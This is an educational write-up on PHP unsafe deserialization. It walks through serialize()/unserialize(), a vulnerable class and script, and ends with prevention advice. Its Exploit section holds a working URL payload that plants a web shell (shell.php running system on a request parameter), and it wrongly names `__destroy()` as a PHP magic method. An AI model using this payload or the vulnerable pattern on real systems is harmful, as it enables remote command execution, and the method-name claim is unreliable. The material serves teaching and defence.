![Unsafe Deserialization](image/serialization.png?raw=true "Unsafe Deserialization")
# Description
Unsafe Deserialization (also referred to as Insecure Deserialization) is a vulnerability wherein malformed and untrusted data input is insecurely deserialized by an application. It is exploited to hijack the logic flow of the application end might result in the execution of arbitrary code.

# Understanding Serialization and UnSerialization

## Serialize()

The serialize() function converts a storable representation of a value. To serialize data means to convert a value to a sequence of bits, so that it can be stored in a file, a memory buffer, or transmitted across a network.

Example:

```php
<?php

$our_array = array("Pentester","Nepal");
$serialized = serialize($our_array);
echo $serialized;

?>

```
Returns:
`a:2:{i:0;s:9:"Pentester";i:1;s:5:"Nepal";}`

Understanding the serialized string;

| String     | Meaning      |
| ------------- | ------------- | 
|a:2{|	    Array of 2 values|
|i:0|	       Integer, value [ index-0]|
|S:9:"Pentester"|    String, 9 chars long, string value "Pentester"|
|i:1|	Integer, value [index-1]|
|S:5:"Nepal"|	String , 5 chars long, string value "Nepal"


## unserialize()
Convert serialized data back into actual data.

Example:

```php
<?php
$data = serialize(array("Pentester", "Nepal"));

$test = unserialize($data);
var_dump($test);
?>
```
Returns:
`array(2) { [0]=> string(9) "Pentester" [1]=> string(5) "Nepal" }`

# Vulnerability

For example, the following script creates an instance of the object FSResource, serializes it, and then prints the string representation of the object.

```php
<?php

class FSResource {

    function __construct($path) {
        $this->path = $path;
        if (file_exists($path)) {
          $this->content = file_get_contents($path);
        }
    }

    function __destruct() {
        file_put_contents($this->path, $this->content);
    }

}

$resource = new FSResource('/tmp/file');
print(serialize($resource));

# Prints the following string representation:
# O:10:"FSResource":2:{s:4:"path";s:9:"/tmp/file";s:7:"content";s:0:"";}
```

The exploitation of deserialization in PHP is called PHP Object Injection, which happens when user-controlled input is passed as the first argument of the unserialize() function. This is a vulnerable script.php:

```php
<?php

$instance = unserialize($_GET["data"]);
?>
```

To be exploitable, the vulnerable piece of code must have enough PHP code in scope to build a working POP chain, a chain of reusable PHP code that causes a meaningful impact when invoked. The chain usually starts by triggering `__destroy()` or `__wakeup()` PHP magic methods, called when the object is destroyed or deserialized, in order to call other gadgets to conduct malicious actions on the system.

If the class FSResource defined in the paragrah above is in scope, an attacker could send an HTTP request containing a serialized representation of an FSResource object that creates a malicious PHP file to path with an arbitrary content when the `__destruct()` magic method is called upon destruction.

# Exploit

`http://localhost/script.php?data=O:10:%22FSResource%22:2:{s:4:%22path%22;s:9:%22shell.php%22;s:7:%22content%22;s:27:%22%3C?php%20system($_GET[%22cmd%22]);%22;}`

The payload above decodes as `O:10:"FSResource":2:{s:4:"path";s:9:"shell.php";s:7:"content";s:27:"<?php system($_GET["cmd"]);";}` and, when deserialized, it creates the shell.php allowing the attacker to run arbitrary commands on the systems.

# Prevention
Never use the unserialize() function on user-supplied input, and preferably use data-only serialization formats such as JSON. If you need to use PHP deserialization, a second optional parameter has been added in PHP 7 that enables you to specify an allow list of allowed classes.